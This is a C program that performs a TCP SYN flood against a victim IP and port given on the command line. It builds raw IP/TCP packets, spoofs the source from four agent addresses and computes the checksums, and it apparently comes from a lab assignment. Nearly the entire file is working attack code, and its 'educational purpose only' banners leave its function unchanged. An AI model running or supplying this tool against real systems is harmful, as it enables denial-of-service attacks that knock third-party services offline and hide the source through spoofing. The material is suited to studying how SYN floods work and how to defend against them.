#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <time.h>
#include <unistd.h>

// Function to calculate IP checksum
unsigned short ip_checksum(unsigned short *buf, int nwords) {
    unsigned long sum;
    for (sum = 0; nwords > 0; nwords--) {
        sum += *buf++;
    }
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    return (unsigned short)(~sum);
}

// Function to generate random IP
void generate_random_ip(char *ip) {
    sprintf(ip, "%d.%d.%d.%d", 
            rand() % 256, 
            rand() % 256, 
            rand() % 256, 
            rand() % 256);
}

int main(int argc, char *argv[]) {
    int raw_socket;
    char packet[4096];
    struct iphdr *ip = (struct iphdr *)packet;
    struct tcphdr *tcp = (struct tcphdr *)(packet + sizeof(struct iphdr));
    struct sockaddr_in dest_addr;
    
    if (argc != 4) {
        printf("Usage: %s <victim_ip> <victim_port> <packet_count>\n", argv[0]);
        printf("Example: %s 10.0.0.2 80 1000\n", argv[0]);
        printf("WARNING: For educational use only in controlled environments!\n");
        exit(1);
    }
    
    char *victim_ip = argv[1];
    int victim_port = atoi(argv[2]);
    int packet_count = atoi(argv[3]);
    
    printf("========================================\n");
    printf("TCP SYN Flood Attack Simulation\n");
    printf("Educational Purpose Only - Lab Environment\n");
    printf("========================================\n");
    printf("Victim IP: %s\n", victim_ip);
    printf("Victim Port: %d\n", victim_port);
    printf("Packet Count: %d\n", packet_count);
    printf("========================================\n\n");
    
    // Create raw socket
    raw_socket = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (raw_socket < 0) {
        perror("Socket creation failed");
        exit(1);
    }
    
    // Enable IP_HDRINCL to set IP header manually
    int one = 1;
    const int *val = &one;
    if (setsockopt(raw_socket, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0) {
        perror("Setsockopt failed");
        close(raw_socket);
        exit(1);
    }
    
    // Set destination address
    memset(&dest_addr, 0, sizeof(dest_addr));
    dest_addr.sin_family = AF_INET;
    dest_addr.sin_addr.s_addr = inet_addr(victim_ip);
    dest_addr.sin_port = htons(victim_port);
    
    printf("Starting SYN flood attack simulation...\n");
    printf("Using 4 spoofed agent IPs to send SYN packets\n\n");
    
    // Seed random number generator
    srand(time(NULL));
    
    // Define 4 spoofed agent IPs (as mentioned in assignment)
    char agent_ips[4][20] = {
        "192.168.1.101",
        "192.168.1.102", 
        "192.168.1.103",
        "192.168.1.104"
    };
    
    int packets_sent = 0;
    clock_t start_time = clock();
    
    for (int i = 0; i < packet_count; i++) {
        // Clear packet buffer
        memset(packet, 0, sizeof(packet));
        
        // Select random agent IP for spoofing
        int agent_index = rand() % 4;
        char *spoofed_ip = agent_ips[agent_index];
        
        // Fill IP header
        ip->ihl = 5;
        ip->version = 4;
        ip->tos = 0;
        ip->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
        ip->id = htons(rand() % 65535);
        ip->frag_off = 0;
        ip->ttl = 255;
        ip->protocol = IPPROTO_TCP;
        ip->saddr = inet_addr(spoofed_ip);  // Spoofed source IP
        ip->daddr = inet_addr(victim_ip);   // Victim IP
        ip->check = 0;
        ip->check = ip_checksum((unsigned short *)ip, sizeof(struct iphdr) / 2);
        
        // Fill TCP header
        tcp->source = htons(rand() % 65535);      // Random source port
        tcp->dest = htons(victim_port);           // Victim port
        tcp->seq = htonl(rand() % 4294967295);    // Random sequence number
        tcp->ack_seq = 0;
        tcp->doff = 5;                            // TCP header length
        tcp->fin = 0;
        tcp->syn = 1;                             // SYN flag set (attack!)
        tcp->rst = 0;
        tcp->psh = 0;
        tcp->ack = 0;
        tcp->urg = 0;
        tcp->window = htons(5840);
        tcp->check = 0;                           // Will calculate
        tcp->urg_ptr = 0;
        
        // Pseudo header for TCP checksum
        struct pseudo_header {
            unsigned int source_address;
            unsigned int dest_address;
            unsigned char placeholder;
            unsigned char protocol;
            unsigned short tcp_length;
        } psh;
        
        psh.source_address = inet_addr(spoofed_ip);
        psh.dest_address = inet_addr(victim_ip);
        psh.placeholder = 0;
        psh.protocol = IPPROTO_TCP;
        psh.tcp_length = htons(sizeof(struct tcphdr));
        
        // Calculate TCP checksum
        int psize = sizeof(struct pseudo_header) + sizeof(struct tcphdr);
        char *pseudogram = malloc(psize);
        
        memcpy(pseudogram, (char *)&psh, sizeof(struct pseudo_header));
        memcpy(pseudogram + sizeof(struct pseudo_header), tcp, sizeof(struct tcphdr));
        
        tcp->check = ip_checksum((unsigned short *)pseudogram, psize / 2);
        free(pseudogram);
        
        // Send packet
        if (sendto(raw_socket, packet, ntohs(ip->tot_len), 0, 
                   (struct sockaddr *)&dest_addr, sizeof(dest_addr)) < 0) {
            perror("Send failed");
            break;
        }
        
        packets_sent++;
        
        // Show progress every 100 packets
        if (packets_sent % 100 == 0) {
            printf("Sent %d packets... (Agent: %s)\n", packets_sent, spoofed_ip);
        }
        
        // Small delay to avoid overwhelming
        usleep(1000);  // 1ms delay
    }
    
    clock_t end_time = clock();
    double total_time = ((double)(end_time - start_time)) / CLOCKS_PER_SEC;
    
    printf("\n========================================\n");
    printf("Attack Simulation Completed\n");
    printf("========================================\n");
    printf("Total packets sent: %d\n", packets_sent);
    printf("Time taken: %.2f seconds\n", total_time);
    printf("Packets per second: %.2f\n", packets_sent / total_time);
    printf("Spoofed agents used:\n");
    for (int i = 0; i < 4; i++) {
        printf("  Agent %d: %s\n", i+1, agent_ips[i]);
    }
    printf("========================================\n");
    printf("Educational simulation complete.\n");
    printf("Check Wireshark to see SYN flood pattern.\n");
    
    close(raw_socket);
    return 0;
}